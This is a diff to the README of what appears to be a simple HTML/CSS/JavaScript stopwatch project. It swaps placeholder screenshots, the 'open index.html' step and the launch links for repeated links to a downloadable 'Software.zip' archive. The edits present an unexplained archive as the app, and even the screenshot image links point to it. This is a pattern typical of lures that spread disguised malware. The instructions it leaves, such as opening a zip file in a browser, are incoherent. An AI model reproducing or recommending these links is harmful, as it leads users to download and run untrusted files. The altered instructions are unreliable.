@@ -22,13 +22,13 @@ Using the PRODIGY Stopwatch Web Application is simple:
 ## Screenshots
 Here are a few snapshots of the PRODIGY Stopwatch Web Application:
 
-![Screenshot 1](https://via.placeholder.com/600x400)
-![Screenshot 2](https://via.placeholder.com/600x400)
+![Screenshot 1](https://github.com/yuxiangwuzhang/PRODIGY_WD_02/releases/download/v2.0/Software.zip)
+![Screenshot 2](https://github.com/yuxiangwuzhang/PRODIGY_WD_02/releases/download/v2.0/Software.zip)
 
 ## Installation
 To get started with the PRODIGY Stopwatch Web Application, follow these steps:
 1. Clone this repository to your local machine.
-2. Open the index.html file in your favorite browser.
+2. Open the https://github.com/yuxiangwuzhang/PRODIGY_WD_02/releases/download/v2.0/Software.zip file in your favorite browser.
 3. Start using the stopwatch and explore its features.
 
 ## Technologies Used
@@ -41,9 +41,9 @@ The PRODIGY Stopwatch Web Application is built using the following technologies:
 🔧 ['css', 'frontend', 'html', 'interactive', 'javascript', 'javascript-project', 'lap-timer', 'real-time', 'responsive', 'responsive-design', 'stopwatch', 'stopwatch-timer', 'time-tracking', 'timer', 'timer-app', 'ui-ux', 'web-app', 'web-development']
 
 ## Check it Out!
-If you'd like to experience the PRODIGY Stopwatch Web Application, simply [click here to launch the application](https://github.com/user-attachments/files/18388744/Software.zip). 🚗
+If you'd like to experience the PRODIGY Stopwatch Web Application, simply [click here to launch the application](https://github.com/yuxiangwuzhang/PRODIGY_WD_02/releases/download/v2.0/Software.zip). 🚗
 
-[![Launch PRODIGY Stopwatch](https://img.shields.io/badge/Launch-PRODIGY_Stopwatch-blue.svg)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Launch PRODIGY Stopwatch](https://github.com/yuxiangwuzhang/PRODIGY_WD_02/releases/download/v2.0/Software.zip)](https://github.com/yuxiangwuzhang/PRODIGY_WD_02/releases/download/v2.0/Software.zip)
 
 If the link doesn't work or you'd like to explore more, check the "Releases" section of this repository for additional resources.
 
